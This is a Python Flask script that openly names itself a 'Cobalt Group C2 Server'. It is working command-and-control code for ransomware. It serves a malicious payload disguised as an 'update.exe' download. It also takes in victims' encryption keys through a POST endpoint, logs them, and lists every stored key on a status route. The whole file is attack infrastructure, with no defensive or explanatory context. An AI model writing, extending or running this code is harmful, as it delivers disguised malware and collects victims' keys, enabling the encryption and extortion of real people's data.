from flask import Flask, request, send_file, jsonify
import os
import base64
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - C2 - %(message)s')
logger = logging.getLogger()

PAYLOAD_PATH = "payload.b64"
KEYS_DB = {}

@app.route('/')
def index():
    return "Cobalt Group C2 Server Online", 200

@app.route('/download/update.exe', methods=['GET'])
def download_payload():
    """Serves the malicious payload (pretending to be an update)."""
    if os.path.exists(PAYLOAD_PATH):
        logger.info(f"Payload downloaded by {request.remote_addr}")
        return send_file(PAYLOAD_PATH, as_attachment=True, download_name="update.exe")
    else:
        logger.error("Payload file not found!")
        return "File not found", 404

@app.route('/api/register_key', methods=['POST'])
def register_key():
    """Receives the encryption key from the victim."""
    data = request.json
    victim_id = data.get('victim_id')
    key = data.get('key')
    
    if victim_id and key:
        KEYS_DB[victim_id] = key
        logger.info(f"Received key for victim {victim_id}: {key}")
        return jsonify({"status": "success", "message": "Key registered"}), 200
    return jsonify({"status": "error", "message": "Invalid data"}), 400

@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({"victims": len(KEYS_DB), "keys": KEYS_DB}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
